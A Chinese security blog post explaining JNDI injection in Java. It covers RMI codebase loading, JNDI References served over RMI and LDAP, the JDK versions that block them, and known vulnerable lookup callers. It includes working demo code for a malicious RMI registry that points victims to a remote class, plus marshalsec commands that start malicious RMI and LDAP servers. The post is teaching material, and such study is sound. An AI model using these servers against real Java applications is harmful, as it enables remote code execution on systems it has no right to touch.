---
title: "攻击Java中的JNDI、RMI、LDAP(二)"
date: 2020-04-03T10:06:44+08:00
draft: false
tags:
- Java
- RMI
- JNDI
- LDAP
series:
-
categories:
- 代码审计
---

上文我简述了JNDI，本文我将演示如何攻击JNDI。
<!--more-->

## JNDI注入
这个东西是BlackHat 2016（USA）的一个议题 ["A Journey From JNDI LDAP Manipulation To RCE"](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf) 提出的。他的攻击步骤可以概括为以下几步：

1. 服务端实例化JNDI InitialContext请求attacker的恶意RMIServer
2. InitialContext初始化期间lookup rmi://attacker/Obj
3. 恶意RMIServer返回JNDI Reference
4. 服务端接收到JNDI Reference之后会从恶意RMIServer获取工厂类
5. 恶意RMIServer返回的工厂类中带有static块的Java代码，造成任意代码执行

## 攻击JNDI
作者水平有限，本文仅讲述以下几种攻击JNDI的方法。
1. JNDI 配合 RMI Remote Object(codebase)
2. JNDI Reference 配合 RMI
3. JNDI Reference 配合 LDAP

### RMI Remote Object
在早期Java是可以运行在浏览器中的，也就是Applet。使用Applet通常需要指定一个codebase参数，比如：

```java
<applet code="HelloWorld.class" codebase="Applets" width="800" height="600"></applet>
```
codebase是一个类地址，它告诉Java应该从哪里寻找class，就像classpath一样，但与classpath不一样的是codebase如果从本地加载不到，就会从远程地址中加载。如果codebase地址可控，在RMI中，codebase是和序列化数据一起传输的，所以会造成RCE。

但是codebase需要满足两个条件：

1. 安装并配置了SecurityManager
2. Java版本低于7u21、6u45，或者设置了 `java.rmi.server.useCodebaseOnly=false`

官方将 `java.rmi.server.useCodebaseOnly` 的默认值由 false 改为了 true 。 `java.rmi.server.useCodebaseOnly`配置为 true 的情况下，Java虚拟机将只信任预先配置好的 `codebase`，不再支持从RMI请求中获取。所以这个东西特别鸡肋。

在大多数情况下，你可以在命令行上通过属性 `java.rmi.server.codebase` 来设置Codebase。

例如，如果所需的类文件在Webserver的根目录下，那么设置Codebase的命令行参数如下（如果你把类文件打包成了jar，那么设置Codebase时需要指定这个jar文件）

```bash
-Djava.rmi.server.codebase=http://url:8080/
```

当接收程序试图从该URL的Webserver上下载类文件时，它会把类的包名转化成目录，在Codebase 的对应目录下查询类文件，如果你传递的是类文件 com.project.test ，那么接受方就会到下面的URL去下载类文件： 

```
http://url:8080/com/project/test.class
```

### JNDI Reference配合RMI

看一下演示代码，同样本文仍然使用的是[Longofo](https://github.com/longofo/rmi-jndi-ldap-jrmp-jmx-jms)师傅的代码。

```java
package com.longofo.jndi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer1 {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        // 创建Registry
        Registry registry = LocateRegistry.createRegistry(9999);
        System.out.println("java RMI registry created. port on 9999...");
        Reference refObj = new Reference("ExportObject", "com.longofo.remoteclass.ExportObject", "http://127.0.0.1:8000/");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
        registry.bind("refObj", refObjWrapper);
    }
}
```

```java
package com.longofo.jndi;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;

public class RMIClient1 {
    public static void main(String[] args) throws RemoteException, NotBoundException, NamingException {
//        Properties env = new Properties();
//        env.put(Context.INITIAL_CONTEXT_FACTORY,
//                "com.sun.jndi.rmi.registry.RegistryContextFactory");
//        env.put(Context.PROVIDER_URL,
//                "rmi://localhost:9999");

        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        // 下面这行是我自己加的 8u221需要 原因看下文
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        Context ctx = new InitialContext();
        DirContext dirc = new InitialDirContext();
        ctx.lookup("rmi://localhost:9999/refObj");
    }
}
```

在RMIClient1.java中，我把`com.sun.jndi.ldap.object.trustURLCodebase`设置为true，没加上之前一直不成功，一步一步跟一下才解决问题，看下我的分析步骤：

跟进lookup，然后在`javax/naming/spi/NamingManager.java:146`会尝试从本地加载类
![image.png](https://y4er.com/img/uploads/20200419226219.png)

如不在classpath中会尝试从codebase加载
![image.png](https://y4er.com/img/uploads/20200419224213.png)

跟进loadClass

```java
public Class<?> loadClass(String className, String codebase)
    throws ClassNotFoundException, MalformedURLException {
    if ("true".equalsIgnoreCase(trustURLCodebase)) {
        ClassLoader parent = getContextClassLoader();
        ClassLoader cl =
            URLClassLoader.newInstance(getUrlArray(codebase), parent);

        return loadClass(className, cl);
    } else {
        return null;
    }
}
```

发现依据`trustURLCodebase`的值来判断是否加载，在类的属性中发现`trustURLCodebase`取决于`com.sun.jndi.ldap.object.trustURLCodebase`的值。堆栈

```java
loadClass:101, VersionHelper12 (com.sun.naming.internal)
getObjectFactoryFromReference:158, NamingManager (javax.naming.spi)
getObjectInstance:319, NamingManager (javax.naming.spi)
decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)
lookup:138, RegistryContext (com.sun.jndi.rmi.registry)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:417, InitialContext (javax.naming)
main:24, RMIClient1 (com.longofo.jndi)
```

```java
private static final String TRUST_URL_CODEBASE_PROPERTY = "com.sun.jndi.ldap.object.trustURLCodebase";
private static final String trustURLCodebase =
    AccessController.doPrivileged(
    new PrivilegedAction<String>() {
        public String run() {
            try {
                return System.getProperty(TRUST_URL_CODEBASE_PROPERTY,
                                          "false");
            } catch (SecurityException e) {
                return "false";
            }
        }
    }
);
```

最后的效果就是这样

![image.png](https://y4er.com/img/uploads/20200419226392.png)

在实战用我更倾向于使用marshalsec来起RMI恶意服务，RMI服务端口号默认为1099

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://ip:80/#ExportObject 1099
```
你仍然需要自己启动web服务

### JNDI Reference配合LDAP
在上文中说过，JNDI一般配合RMI、LDAP等协议进行使用，所以上文中有RMI，自然就有LDAP。使用LDAP与上文中的RMI大同小异。所以我直接使用marshalsec启动LDAP服务，LDAP服务默认端口号为1389。

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ip:80/#ExportObject 1389
```

## JNDI注入的JDK版本限制
由于JNDI注入动态加载的原理是使用Reference引用Object Factory类，其内部在上文中也分析到了使用的是URLClassLoader，所以不受`java.rmi.server.useCodebaseOnly=false`属性的限制。

但是不可避免的受到 `com.sun.jndi.rmi.object.trustURLCodebase`、`com.sun.jndi.cosnaming.object.trustURLCodebase`的限制。

1. JDK 5U45、6U45、7u21、8u121 开始 `java.rmi.server.useCodebaseOnly` 默认配置为true
2. JDK 6u132、7u122、8u113 开始 `com.sun.jndi.rmi.object.trustURLCodebase` 默认值为false
3. JDK 11.0.1、8u191、7u201、6u211 `com.sun.jndi.ldap.object.trustURLCodebase` 默认为false

一张图来展示JNDI注入的利用方式与JDK版本的关系：

![image.png](https://y4er.com/img/uploads/20200419225882.png)

> 图引用于 https://xz.aliyun.com/t/6633

小声逼逼:java每个版本的属性多多少少都有点不一样，对于搞安全的来讲实在是太累了:<

## 已知的JNDI注入
对于JNDI注入，需要注意：

1. 仅由InitialContext或其子类初始化的Context对象（InitialDirContext或InitialLdapContext）容易受到JNDI注入攻击
2. InitialContext可以通过JNDI动态协议转换覆盖
3. InitialContext.rename()和InitialContext.lookupLink()最终也调用了lookup()

还有一些包装类也调用了lookup()，比如：Spring的JndiTemplate。

1. [JtaTransactionManager](https://zerothoughts.tumblr.com/post/137831000514/spring-framework-deserialization-rce) found by zerothinking
2. [com.sun.rowset.JdbcRowSetImpl](https://codewhitesec.blogspot.com/2016/05/return-of-rhino-old-gadget-revisited.html) found by matthias_kaiser
3. [javax.management.remote.rmi.RMIConnector.connect()](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf) found by pwntester
4. [org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName()](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf) found by pwntester

这些带佬是真的强...

## 小结
本文简述了如何攻击JNDI，以及一些限制条件，并且列举了一些已知的JNDI注入，解释了上文中留下来的坑。下文将讲述RMI。

## 参考链接
1. https://paper.seebug.org/1091/
2. Java安全漫谈 - 05.RMI篇(2)
3. https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html
4. https://xz.aliyun.com/t/6633
5. https://javasec.org/javase/JNDI/


**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**